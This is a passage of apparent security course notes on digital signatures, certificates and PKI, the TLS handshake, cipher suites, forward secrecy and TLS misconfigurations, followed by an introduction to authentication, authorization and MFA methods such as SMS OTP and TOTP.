        KeyPairGenerator generator = KeyPairGenerator.getInstance("RSA");
        generator.initialize(2048);
        return generator.generateKeyPair();
    }
    
    /**
     * Sign data with private key
     */
    public static byte[] sign(byte[] data, PrivateKey privateKey) throws Exception {
        Signature signature = Signature.getInstance(ALGORITHM);
        signature.initSign(privateKey);
        signature.update(data);
        return signature.sign();
    }
    
    /**
     * Verify signature with public key
     */
    public static boolean verify(byte[] data, byte[] signatureBytes, 
                                  PublicKey publicKey) throws Exception {
        Signature signature = Signature.getInstance(ALGORITHM);
        signature.initVerify(publicKey);
        signature.update(data);
        return signature.verify(signatureBytes);
    }
    
    public static void main(String[] args) throws Exception {
        // Generate keys
        KeyPair keyPair = generateKeyPair();
        
        // Message to sign
        String message = "Transfer $1000 to Bob";
        byte[] messageBytes = message.getBytes("UTF-8");
        
        // Sign with private key
        byte[] signatureBytes = sign(messageBytes, keyPair.getPrivate());
        System.out.println("Signature: " + 
            Base64.getEncoder().encodeToString(signatureBytes));
        
        // Verify with public key
        boolean valid = verify(messageBytes, signatureBytes, keyPair.getPublic());
        System.out.println("Signature valid: " + valid);  // true
        
        // Tamper with message
        String tampered = "Transfer $10000 to Attacker";
        boolean tamperedValid = verify(
            tampered.getBytes("UTF-8"), signatureBytes, keyPair.getPublic()
        );
        System.out.println("Tampered valid: " + tamperedValid);  // false!
    }
}
```

### Where Signatures Are Used
```
1. CODE SIGNING
   • JAR files signed by developers
   • Android APKs must be signed
   • Windows executables (.exe) signed
   → Proves code comes from trusted source

2. JWT TOKENS
   • JWT signature proves token wasn't modified
   • Server signs with private key
   • Anyone can verify with public key (RS256)
   → Session 7 covers this in depth

3. TLS CERTIFICATES
   • Certificate Authority signs your certificate
   • Browser verifies signature
   → Coming up in this session!

4. GIT COMMITS
   • Developers sign commits with GPG
   • Proves who made the commit
   → "Verified" badge on GitHub

5. DOCUMENTS
   • PDF digital signatures
   • DocuSign, Adobe Sign
   → Legal validity of electronic signatures
```

---

## 2. CERTIFICATES - Digital Identity Cards

### The Trust Problem

PROBLEM: How does Bob know he has Alice's REAL public key?

Attacker could say: "Here's Alice's public key" (but it's actually attacker's key!)

      Alice's Real Key: 🔓A
      Attacker's Key:   🔓X

Bob thinks he has 🔓A but actually has 🔓X
Now attacker can:
  • Decrypt messages Bob sends to "Alice"
  • Sign messages pretending to be Alice

==This is a **MAN-IN-THE-MIDDLE** attack.==


### Certificates Solve This

A CERTIFICATE is a SIGNED statement saying: "This public key belongs to this identity"

```
┌─────────────────────────────────────────────────────────────────────────┐
│                        X.509 CERTIFICATE                                │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  Subject: CN=www.google.com, O=Google LLC, L=Mountain View, ST=CA, C=US │
│                                                                         │
│  Issuer: CN=GTS CA 1C3, O=Google Trust Services LLC, C=US               │
│                                                                         │
│  Valid From: 2024-01-01                                                 │
│  Valid To:   2024-03-31                                                 │
│                                                                         │
│  Public Key: (RSA 2048-bit)                                             │
│  30 82 01 0a 02 82 01 01 00 bb 21 e9 b5 c6 3b 5c ...                   │
│                                                                         │
│  Signature Algorithm: SHA256withRSA                                     │
│  Signature: (signed by Issuer's private key)                            │
│  4a 7c 9d 2f 8b 5e 1a 3c ...                                           │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

Translation:
"Google Trust Services vouches that this public key belongs to www.google.com"
"If you trust Google Trust Services, you can trust this certificate"

### Certificate Fields Explained
```
┌──────────────────┬───────────────────────────────────────────────────────┐
│ Field            │ Meaning                                               │
├──────────────────┼───────────────────────────────────────────────────────┤
│ Subject          │ WHO this certificate is for                           │
│   CN             │ Common Name (domain name or entity name)              │
│   O              │ Organization                                          │
│   OU             │ Organizational Unit                                   │
│   L              │ Locality (city)                                       │
│   ST             │ State/Province                                        │
│   C              │ Country                                               │
├──────────────────┼───────────────────────────────────────────────────────┤
│ Issuer           │ WHO signed this certificate (the CA)                  │
├──────────────────┼───────────────────────────────────────────────────────┤
│ Serial Number    │ Unique ID from the issuer                             │
├──────────────────┼───────────────────────────────────────────────────────┤
│ Validity Period  │ Not Before / Not After dates                          │
├──────────────────┼───────────────────────────────────────────────────────┤
│ Public Key       │ The actual public key being certified                 │
├──────────────────┼───────────────────────────────────────────────────────┤
│ Extensions       │ Additional info (key usage, SAN, etc.)                │
│   SAN            │ Subject Alternative Names (additional domains)        │
│   Key Usage      │ What the key can be used for                          │
├──────────────────┼───────────────────────────────────────────────────────┤
│ Signature        │ CA's signature over all the above                     │
└──────────────────┴───────────────────────────────────────────────────────┘
```

---

## 3. PKI - Public Key Infrastructure

### The Chain of Trust

THE QUESTION: Why should I trust Google Trust Services?

ANSWER: Because MY BROWSER trusts them!

Browsers/OS come with PRE-INSTALLED "Root Certificates" These are Certificate Authorities (CAs) that browsers trust BY DEFAULT.


```
┌─────────────────────────────────────────────────────────────────────────┐
│                      CERTIFICATE CHAIN                                  │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  ┌─────────────────────────────────────────┐                           │
│  │         ROOT CA CERTIFICATE             │  ← Pre-installed in       │
│  │   Subject: DigiCert Global Root CA      │     browser/OS            │
│  │   Issuer:  DigiCert Global Root CA      │     (SELF-SIGNED)         │
│  │   (Self-signed - trusts itself)         │                           │
│  └────────────────┬────────────────────────┘                           │
│                   │ Signs ↓                                             │
│  ┌────────────────▼────────────────────────┐                           │
│  │      INTERMEDIATE CA CERTIFICATE        │  ← Signed by Root         │
│  │   Subject: DigiCert TLS RSA SHA256 CA   │                           │
│  │   Issuer:  DigiCert Global Root CA      │                           │
│  └────────────────┬────────────────────────┘                           │
│                   │ Signs ↓                                             │
│  ┌────────────────▼────────────────────────┐                           │
│  │        END-ENTITY CERTIFICATE           │  ← Your website's cert    │
│  │   Subject: www.example.com              │     Signed by Intermediate│
│  │   Issuer:  DigiCert TLS RSA SHA256 CA   │                           │
│  └─────────────────────────────────────────┘                           │
│                                                                         │
│  VERIFICATION (bottom-up):                                              │
│  1. Is www.example.com signed by DigiCert TLS RSA SHA256 CA? ✓         │
│  2. Is DigiCert TLS RSA SHA256 CA signed by DigiCert Global Root? ✓    │
│  3. Is DigiCert Global Root in my trusted store? ✓                     │
│  4. CHAIN VERIFIED! ✅                                                  │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### Why Intermediate CAs?

ROOT CA private key is EXTREMELY valuable.
If compromised, attacker can impersonate ANY website.

PROTECTION STRATEGY:
- Root CA kept OFFLINE in vault (air-gapped)
- Root only signs Intermediate CA certificates (rarely)
- Intermediate CAs do daily signing operations
- If Intermediate is compromised, revoke it (Root is safe)

This is DEFENSE IN DEPTH applied to PKI!


### Types of Certificates
```
┌─────────────────┬────────────────────────────────────────────────────────┐
│ Type            │ What CA Verifies                                       │
├─────────────────┼────────────────────────────────────────────────────────┤
│ DV              │ Domain Validation                                      │
│ (Domain)        │ • You control the domain (DNS or email check)          │
│                 │ • Cheapest, fastest (minutes)                          │
│                 │ • Let's Encrypt provides FREE DV certs                 │
│                 │ • Good for: blogs, personal sites, APIs                │
├─────────────────┼────────────────────────────────────────────────────────┤
│ OV              │ Organization Validation                                │
│ (Organization)  │ • Domain ownership + organization exists               │
│                 │ • CA verifies business registration                    │
│                 │ • Days to issue                                        │
│                 │ • Good for: business websites                          │
├─────────────────┼────────────────────────────────────────────────────────┤
│ EV              │ Extended Validation                                    │
│ (Extended)      │ • Strictest verification (legal, operational, physical)│
│                 │ • Weeks to issue, most expensive                       │
│                 │ • Used to show green bar (browsers removed this)       │
│                 │ • Good for: banks, e-commerce (regulatory requirement) │
└─────────────────┴────────────────────────────────────────────────────────┘

FOR MOST APPLICATIONS: DV certificates (Let's Encrypt) are sufficient!
```

---

## 4. TLS/SSL HANDSHAKE - How HTTPS Works

### The Big Picture

HTTPS = HTTP + TLS

Before any HTTP data is sent, TLS handshake establishes:
1. AUTHENTICATION: Server proves its identity (certificate)
2. KEY EXCHANGE: Client and server agree on encryption keys
3. ENCRYPTION: All subsequent data is encrypted

```
┌──────────┐                                        ┌──────────┐
│  CLIENT  │                                        │  SERVER  │
│ (Browser)│                                        │ (Website)│
└────┬─────┘                                        └────┬─────┘
     │                                                   │
     │  ══════════ TLS HANDSHAKE (unencrypted) ═══════  │
     │                                                   │
     │──────────────── ClientHello ─────────────────────►│
     │                                                   │
     │◄─────────────── ServerHello ──────────────────────│
     │◄─────────────── Certificate ──────────────────────│
     │◄─────────────── ServerHelloDone ──────────────────│
     │                                                   │
     │──────────────── ClientKeyExchange ───────────────►│
     │──────────────── ChangeCipherSpec ────────────────►│
     │──────────────── Finished ────────────────────────►│
     │                                                   │
     │◄─────────────── ChangeCipherSpec ─────────────────│
     │◄─────────────── Finished ─────────────────────────│
     │                                                   │
     │  ═══════════ APPLICATION DATA (encrypted) ══════  │
     │                                                   │
     │◄════════════════ GET /index.html ════════════════►│
     │◄════════════════ HTTP Response ══════════════════►│
     │                                                   │
```

### TLS 1.2 Handshake Step-by-Step
```
STEP 1: CLIENT HELLO
┌─────────────────────────────────────────────────────────────────────────┐
│ Client → Server                                                         │
├─────────────────────────────────────────────────────────────────────────┤
│ "Hi! I want to connect securely. Here's what I support:"                │
│                                                                         │
│ • TLS Version: 1.2, 1.3                                                 │
│ • Cipher Suites: TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,                 │
│                  TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256, ...             │
│ • Compression Methods: null                                             │
│ • Random: 32 bytes of random data (for key derivation)                  │
│ • Extensions: SNI (server name), supported_groups, etc.                 │
└─────────────────────────────────────────────────────────────────────────┘

STEP 2: SERVER HELLO
┌─────────────────────────────────────────────────────────────────────────┐
│ Server → Client                                                         │
├─────────────────────────────────────────────────────────────────────────┤
│ "Got it! Let's use these:"                                              │
│                                                                         │
│ • TLS Version: 1.2                                                      │
│ • Cipher Suite: TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384                   │
│ • Random: 32 bytes of random data (server's contribution)               │
│ • Session ID: (for session resumption)                                  │
└─────────────────────────────────────────────────────────────────────────┘

STEP 3: CERTIFICATE
┌─────────────────────────────────────────────────────────────────────────┐
│ Server → Client                                                         │
├─────────────────────────────────────────────────────────────────────────┤
│ "Here's my certificate chain. Verify my identity!"                      │
│                                                                         │
│ • Server Certificate (www.example.com)                                  │
│ • Intermediate CA Certificate                                           │
│ • (Root CA is already in client's trust store)                          │
└─────────────────────────────────────────────────────────────────────────┘

Client verifies:
✓ Certificate chain signatures valid
✓ Certificate not expired
✓ Certificate not revoked (OCSP/CRL)
✓ Domain name matches (www.example.com)
✓ Root CA is trusted

STEP 4: KEY EXCHANGE (ECDHE)
┌─────────────────────────────────────────────────────────────────────────┐
│ Both parties perform Elliptic Curve Diffie-Hellman                      │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│ Server: Generates ECDH key pair, sends public part                      │
│ Client: Generates ECDH key pair, sends public part                      │
│                                                                         │
│ MAGIC: Both can now compute the SAME shared secret!                     │
│        But anyone watching the exchange CANNOT compute it.              │
│                                                                         │
│ Shared Secret + Client Random + Server Random                           │
│                      ↓                                                  │
│              Master Secret                                              │
│                      ↓                                                  │
│         Session Keys (encryption + MAC)                                 │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘

STEP 5: FINISHED
┌─────────────────────────────────────────────────────────────────────────┐
│ Both sides send "Finished" message encrypted with new keys              │
├─────────────────────────────────────────────────────────────────────────┤
│ • Proves both sides derived the same keys                               │
│ • Contains hash of entire handshake (prevents tampering)                │
│ • If either side's Finished is wrong → handshake fails                  │
└─────────────────────────────────────────────────────────────────────────┘

🎉 HANDSHAKE COMPLETE - All subsequent data is encrypted!
```

### TLS 1.3 - Faster and More Secure
```
TLS 1.3 (2018) improvements:

1. FASTER: 1-RTT handshake (vs 2-RTT in TLS 1.2)
   • Client sends key share in first message
   • Connection established in ONE round trip

2. MORE SECURE:
   • Removed insecure algorithms (RSA key exchange, CBC, SHA-1)
   • Only AEAD ciphers (AES-GCM, ChaCha20-Poly1305)
   • Forward secrecy REQUIRED (ECDHE always)

3. 0-RTT RESUMPTION:
   • Returning clients can send data immediately
   • (With replay attack considerations)

┌──────────┐                                        ┌──────────┐
│  CLIENT  │                                        │  SERVER  │
└────┬─────┘                                        └────┬─────┘
     │                                                   │
     │─── ClientHello + KeyShare ───────────────────────►│
     │                                                   │
     │◄── ServerHello + KeyShare + Cert + Finished ──────│
     │                                                   │
     │─── Finished ─────────────────────────────────────►│
     │                                                   │
     │◄═══════════ Encrypted Data ═════════════════════►│
     │                                                   │

Only 1 round trip! (TLS 1.2 needs 2)
```

---

## 5. CIPHER SUITES - What Gets Negotiated

### Anatomy of a Cipher Suite
```
TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
│    │     │        │   │   │    │
│    │     │        │   │   │    └── PRF Hash (key derivation)
│    │     │        │   │   │
│    │     │        │   │   └── AEAD Mode (authenticated encryption)
│    │     │        │   │
│    │     │        │   └── Key Size (256-bit)
│    │     │        │
│    │     │        └── Bulk Encryption Algorithm
│    │     │
│    │     └── Authentication (certificate signature verification)
│    │
│    └── Key Exchange Algorithm
│
└── Protocol


COMPONENTS:
- Key Exchange: ECDHE (Elliptic Curve Diffie-Hellman Ephemeral)
  - Creates shared secret
  - "Ephemeral" = new keys each session (forward secrecy)

- Authentication: RSA
  - How server proves identity (certificate signature type)

- Bulk Encryption: AES_256_GCM
  - Encrypts actual data
  - GCM = Galois/Counter Mode (authenticated encryption)

- PRF Hash: SHA384
  - Used for key derivation and handshake integrity
```

### Recommended Cipher Suites (2024)
```
✅ STRONG - USE THESE:

TLS 1.3 (only uses strong ciphers):
- TLS_AES_256_GCM_SHA384
- TLS_AES_128_GCM_SHA256
- TLS_CHACHA20_POLY1305_SHA256

TLS 1.2 (if needed for compatibility):
- TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
- TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
- TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384


❌ WEAK - DISABLE THESE:

- Anything with RSA key exchange (no forward secrecy):
  TLS_RSA_WITH_AES_256_CBC_SHA

- Anything with CBC mode (padding oracle attacks):
  TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA

- Anything with 3DES, RC4, DES:
  TLS_RSA_WITH_3DES_EDE_CBC_SHA

- Anything with MD5 or SHA-1:
  TLS_RSA_WITH_AES_128_CBC_SHA (uses SHA-1)
  
- NULL ciphers (no encryption!):
  TLS_RSA_WITH_NULL_SHA
```

---

## 6. FORWARD SECRECY - Protecting Past Sessions
```
THE PROBLEM (without forward secrecy):

┌─────────────────────────────────────────────────────────────────────────┐
│                                                                         │
│  2024: Attacker records encrypted TLS traffic                           │
│        (can't decrypt yet, but stores it)                               │
│                                                                         │
│  2030: Attacker steals server's private key                             │
│        (through hack, insider, quantum computer)                        │
│                                                                         │
│  RESULT: Attacker can decrypt ALL recorded traffic from 2024!           │
│          Passwords, credit cards, messages - everything!                │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘


THE SOLUTION (with forward secrecy - ECDHE):

┌─────────────────────────────────────────────────────────────────────────┐
│                                                                         │
│  Each session uses EPHEMERAL (temporary) keys for encryption.           │
│  Server's long-term private key only used for AUTHENTICATION.           │
│                                                                         │
│  Session 1: Ephemeral key K1 (discarded after session)                  │
│  Session 2: Ephemeral key K2 (discarded after session)                  │
│  Session 3: Ephemeral key K3 (discarded after session)                  │
│                                                                         │
│  Even if server's private key is stolen:                                │
│  • Attacker can impersonate server for FUTURE connections               │
│  • Attacker CANNOT decrypt PAST sessions (keys are gone!)               │
│                                                                         │
│  This is FORWARD SECRECY (also called Perfect Forward Secrecy / PFS)    │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘

ECDHE = Elliptic Curve Diffie-Hellman EPHEMERAL
        ────────────────────────────────────────
        The "E" is the important part!
```

---

## 7. COMMON TLS MISCONFIGURATIONS
```
┌─────────────────────────────────────────────────────────────────────────┐
│ ❌ MISCONFIGURATION 1: Supporting Old TLS Versions                      │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│ WRONG:                                                                  │
│ server.ssl.enabled-protocols=TLSv1,TLSv1.1,TLSv1.2                     │
│                                                                         │
│ WHY BAD:                                                                │
│ • TLS 1.0 has BEAST, POODLE vulnerabilities                            │
│ • TLS 1.1 has no modern cipher support                                  │
│ • Attacker can force downgrade to weak version                          │
│                                                                         │
│ CORRECT:                                                                │
│ server.ssl.enabled-protocols=TLSv1.2,TLSv1.3                           │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│ ❌ MISCONFIGURATION 2: Weak Cipher Suites                               │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│ WRONG:                                                                  │
│ server.ssl.ciphers=TLS_RSA_WITH_AES_128_CBC_SHA,... (RSA key exchange) │
│                                                                         │
│ WHY BAD:                                                                │
│ • No forward secrecy                                                    │
│ • CBC mode vulnerable to padding oracles                                │
│                                                                         │
│ CORRECT:                                                                │
│ server.ssl.ciphers=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,...           │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│ ❌ MISCONFIGURATION 3: Missing Intermediate Certificates                │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│ WRONG:                                                                  │
│ Only installing end-entity certificate, not the chain                   │
│                                                                         │
│ WHY BAD:                                                                │
│ • Some clients can't build the chain                                    │
│ • Results in "certificate not trusted" errors                           │
│                                                                         │
│ CORRECT:                                                                │
│ Install full chain: End-entity + Intermediate(s)                        │
│ (Root CA is NOT included - client has it)                               │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│ ❌ MISCONFIGURATION 4: Expired Certificates                             │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│ WHY IT HAPPENS:                                                         │
│ • Certificates expire (90 days for Let's Encrypt, 1 year for others)   │
│ • No monitoring/alerting in place                                       │
│ • Manual renewal forgotten                                              │
│                                                                         │
│ SOLUTION:                                                               │
│ • Automate renewal (certbot, ACME protocol)                            │
│ • Monitor certificate expiration                                        │
│ • Alert 30 days before expiry                                          │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│ ❌ MISCONFIGURATION 5: Missing HSTS Header                              │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│ WRONG: No HSTS header, relying only on redirect HTTP → HTTPS           │
│                                                                         │
│ WHY BAD:                                                                │
│ • First request might be HTTP (interceptable)                           │
│ • SSL stripping attacks possible                                        │
│                                                                         │
│ CORRECT:                                                                │
│ Strict-Transport-Security: max-age=31536000; includeSubDomains         │
│                                                                         │
│ This tells browser: "Always use HTTPS, never try HTTP"                  │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
````

---
## ✅ SECURITY CHECKLIST FOR SESSION 4
```
□ Understand difference between signing (private key) and verification (public key)
□ Know the certificate chain: Root CA → Intermediate CA → End-entity
□ Use TLS 1.2 minimum, prefer TLS 1.3
□ Only enable strong cipher suites (ECDHE + AES-GCM)
□ Ensure forward secrecy (ephemeral key exchange)
□ Install complete certificate chain (not just end-entity)
□ Monitor certificate expiration
□ Implement HSTS header
□ Use automated certificate renewal (Let's Encrypt + certbot)
□ Test TLS configuration with SSL Labs
```

---

## 🚫 COMMON MISTAKES
```
1. "Self-signed certificates are fine for production"
   → Browsers will show scary warnings. Users will ignore ALL warnings.
   → Get a real certificate (Let's Encrypt is FREE).

2. "We support TLS 1.0 for compatibility"
   → TLS 1.0 has known vulnerabilities. Drop it.
   → Any system still requiring TLS 1.0 has bigger problems.

3. "RSA key exchange is fine"
   → No forward secrecy. Use ECDHE.

4. "We'll renew certificates manually"
   → You'll forget. It's 2 AM on Saturday. Site goes down.
   → AUTOMATE certificate renewal.

5. "Certificate pinning will make us more secure"
   → Only if you have operational maturity to manage it.
   → Most apps should NOT pin (too risky operationally).

6. "Our internal APIs don't need TLS"
   → Zero Trust: encrypt everything, even internal traffic.
```

---


##  SESSION 4 COMPLETE

**Key Takeaways:**
- Digital signatures prove authenticity, integrity, and non-repudiation
- Certificates bind public keys to identities, signed by trusted CAs
- Certificate chains establish trust: Root → Intermediate → End-entity
- TLS handshake authenticates server and establishes encrypted channel
- Forward secrecy (ECDHE) protects past sessions if keys are later compromised
- TLS 1.3 is faster and more secure than TLS 1.2
- Automate certificate management to prevent outages
---

# AUTHENTICATION FUNDAMENTALS Who Are You? Proving Identity in the Digital World


## 1. THE THREE PILLARS: Identification, Authentication, Authorization

```
These three terms are often confused. Let's fix that forever.

┌─────────────────────────────────────────────────────────────────────────┐
│                                                                         │
│  IDENTIFICATION: "Who are you claiming to be?"                          │
│  ───────────────────────────────────────────                            │
│  • Username, email, employee ID                                         │
│  • Just a CLAIM - no proof yet                                          │
│  • Example: "I am deniz@company.com"                                    │
│                                                                         │
│                          ↓                                              │
│                                                                         │
│  AUTHENTICATION: "Prove it!"                                            │
│  ─────────────────────────                                              │
│  • Password, fingerprint, security key                                  │
│  • VERIFIES the claimed identity                                        │
│  • Example: "Here's my password: ********"                              │
│                                                                         │
│                          ↓                                              │
│                                                                         │
│  AUTHORIZATION: "What are you allowed to do?"                           │
│  ──────────────────────────────────────────                             │
│  • Permissions, roles, access rights                                    │
│  • DETERMINES what actions are permitted                                │
│  • Example: "Deniz can read orders but not delete users"                │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### Real-World Analogy

```
AIRPORT SECURITY:

┌─────────────────────────────────────────────────────────────────────────┐
│                                                                         │
│  1. IDENTIFICATION                                                      │
│     Guard: "Name please?"                                               │
│     You: "Deniz" (claim)                                         │
│                                                                         │
│  2. AUTHENTICATION                                                      │
│     Guard: "Show me your passport"                                      │
│     You: [Shows passport with photo] (proof)                            │
│     Guard: [Compares face to photo] ✓                                   │
│                                                                         │
│  3. AUTHORIZATION                                                       │
│     Guard: "Your boarding pass says Gate B12, Economy"                  │
│     You: Can board flight at B12                                        │
│     You: Cannot enter First Class lounge (not authorized)               │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### In Your Spring Boot Application

java

```java
// ═══════════════════════════════════════════════════════════════════════
// THE THREE STEPS IN CODE
// ═══════════════════════════════════════════════════════════════════════

@RestController
@RequestMapping("/api")
public class OrderController {

    // STEP 1: IDENTIFICATION
    // User claims identity by sending username in login request
    @PostMapping("/login")
    public TokenResponse login(@RequestBody LoginRequest request) {
        String username = request.getUsername();  // "I am deniz@company.com"
        String password = request.getPassword();
        
        // STEP 2: AUTHENTICATION
        // Verify the claim is true
        Authentication auth = authenticationManager.authenticate(
            new UsernamePasswordAuthenticationToken(username, password)
        );
        // If we reach here, identity is VERIFIED
        
        return tokenService.generateToken(auth);
    }
    
    // STEP 3: AUTHORIZATION
    // After authentication, check what user can DO
    @GetMapping("/orders")
    @PreAuthorize("hasRole('ORDER_VIEWER')")  // Authorization check
    public List<Order> getOrders() {
        // Only users with ORDER_VIEWER role can access
        return orderService.findAll();
    }
    
    @DeleteMapping("/users/{id}")
    @PreAuthorize("hasRole('USER_ADMIN')")  // Different authorization
    public void deleteUser(@PathVariable Long id) {
        // Only USER_ADMIN can delete users
        userService.delete(id);
    }
}
```

### Common Confusion Points
```
┌─────────────────────────────────────────────────────────────────────────┐
│                        COMMON MISTAKES                                  │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  ❌ "Authentication failed - you're not authorized"                     │
│     → WRONG terminology! Should be "Authentication failed"              │
│                                                                         │
│  ❌ "You're not authenticated to delete users"                          │
│     → WRONG! You ARE authenticated, but NOT AUTHORIZED                  │
│                                                                         │
│  ✅ CORRECT:                                                            │
│     • 401 Unauthorized = Authentication failed (who are you?)           │
│     • 403 Forbidden = Authorization failed (you can't do that)          │
│                                                                         │
│  NOTE: HTTP status code naming is historically confusing:               │
│     • 401 "Unauthorized" really means "Unauthenticated"                 │
│     • 403 "Forbidden" really means "Unauthorized"                       │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## 2. AUTHENTICATION FACTORS - The Three Types
```
AUTHENTICATION FACTORS: Different TYPES of proof

┌─────────────────────────────────────────────────────────────────────────┐
│                                                                         │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │  SOMETHING YOU KNOW (Knowledge Factor)                          │   │
│  ├─────────────────────────────────────────────────────────────────┤   │
│  │  • Password                                                     │   │
│  │  • PIN                                                          │   │
│  │  • Security questions ("Mother's maiden name")                  │   │
│  │  • Pattern (Android lock screen)                                │   │
│  │                                                                 │   │
│  │  WEAKNESSES:                                                    │   │
│  │  • Can be guessed, stolen, phished                              │   │
│  │  • Users reuse passwords across sites                           │   │
│  │  • Can be observed (shoulder surfing)                           │   │
│  │  • Forgotten → account recovery issues                          │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                                                        │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │  SOMETHING YOU HAVE (Possession Factor)                         │   │
│  ├─────────────────────────────────────────────────────────────────┤   │
│  │  • Phone (SMS code, authenticator app)                          │   │
│  │  • Hardware security key (YubiKey)                              │   │
│  │  • Smart card                                                   │   │
│  │  • Email access (for verification links)                        │   │
│  │                                                                 │   │
│  │  WEAKNESSES:                                                    │   │
│  │  • Can be lost or stolen                                        │   │
│  │  • SIM swapping attacks (for SMS)                               │   │
│  │  • Email account can be compromised                             │   │
│  │  • Battery/connectivity issues                                  │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                                                        │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │  SOMETHING YOU ARE (Inherence Factor / Biometrics)              │   │
│  ├─────────────────────────────────────────────────────────────────┤   │
│  │  • Fingerprint                                                  │   │
│  │  • Face recognition                                             │   │
│  │  • Iris scan                                                    │   │
│  │  • Voice recognition                                            │   │
│  │  • Typing pattern (behavioral biometrics)                       │   │
│  │                                                                 │   │
│  │  WEAKNESSES:                                                    │   │
│  │  • Cannot be changed if compromised!                            │   │
│  │  • Privacy concerns                                             │   │
│  │  • False positives/negatives                                    │   │
│  │  • Can be spoofed (photos, fingerprint molds)                   │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### Factor Strength Comparison
```
SINGLE FACTOR (Weak):
Password only → Phished in seconds

TWO FACTORS (Strong):
Password + Phone → Attacker needs BOTH

THREE FACTORS (Very Strong):
Password + Phone + Fingerprint → Used for high-security (banks, military)


┌─────────────────┬────────────────────────────────────────────────────────┐
│ Attack          │ Factors Defeated                                       │
├─────────────────┼────────────────────────────────────────────────────────┤
│ Phishing        │ Know ✓, Have ✗ (TOTP), Are ✗                          │
│ Password leak   │ Know ✓, Have ✗, Are ✗                                 │
│ Phone theft     │ Know ✗, Have ✓, Are ✗ (if PIN protected)              │
│ SIM swap        │ Know ✗, Have ✓ (SMS only), Are ✗                      │
│ Physical attack │ Know ?, Have ✓, Are ? (coercion)                      │
└─────────────────┴────────────────────────────────────────────────────────┘

KEY INSIGHT: Each factor has different attack vectors.
             Combining factors provides LAYERED protection.
```

---

## 3. MULTI-FACTOR AUTHENTICATION (MFA) METHODS

### SMS OTP (One-Time Password)
```
┌─────────────────────────────────────────────────────────────────────────┐
│                        SMS OTP (⚠️ WEAKEST MFA)                         │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  FLOW:                                                                  │
│  1. User enters password                                                │
│  2. Server sends 6-digit code via SMS                                   │
│  3. User enters code                                                    │
│  4. Server verifies code                                                │
│                                                                         │
│  VULNERABILITIES:                                                       │
│  • SIM Swapping: Attacker convinces carrier to transfer your number     │
│  • SS7 Attacks: Telecom protocol vulnerabilities intercept SMS          │
│  • Malware: Phone malware reads incoming SMS                            │
│  • Social Engineering: "I'm from IT, read me the code"                  │
│                                                                         │
│  VERDICT: Better than nothing, but use TOTP or hardware keys instead    │
│                                                                         │
│  NIST RECOMMENDATION: SMS is "RESTRICTED" authenticator                 │
│                       (acceptable but not preferred)                    │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### TOTP (Time-based One-Time Password)
```
┌─────────────────────────────────────────────────────────────────────────┐
│                        TOTP (✅ RECOMMENDED)                            │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  Apps: Google Authenticator, Authy, Microsoft Authenticator, 1Password  │
│                                                                         │
│  HOW IT WORKS:                                                          │
│  ┌─────────────────────────────────────────────────────────────────┐    │
│  │                                                                 │    │
│  │  Setup (once):                                                  │    │
│  │  • Server generates random SECRET KEY (e.g., "JBSWY3DPEHPK3PXP")│    │
│  │  • Server shows QR code containing the secret                   │    │
│  │  • User scans QR code with authenticator app                    │    │
│  │  • Both server and app now share the SECRET                     │    │
│  │                                                                 │    │
│  │  Login (every time):                                            │    │
│  │  • App computes: TOTP = HMAC-SHA1(secret, time/30) → 6 digits   │    │
│  │  • Server computes SAME thing                                   │    │
│  │  • If codes match → authenticated                               │    │
│  │                                                                 │    │
│  │  Time Window: Code changes every 30 seconds                     │    │
│  │  Server accepts: current code ± 1 window (for clock drift)      │    │
│  │                                                                 │    │
│  └─────────────────────────────────────────────────────────────────┘    │
│                                                                         │
│  ADVANTAGES:                                                            │
│  • Works offline (no SMS network needed)                                │
│  • No SIM swap vulnerability                                            │
│  • Standardized (RFC 6238)                                              │
│                                                                         │
│  VULNERABILITIES:                                                       │
│  • Phishable: User can be tricked into entering code on fake site       │
│  • Secret theft: If server's secret DB is stolen, all TOTP compromised  │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
````

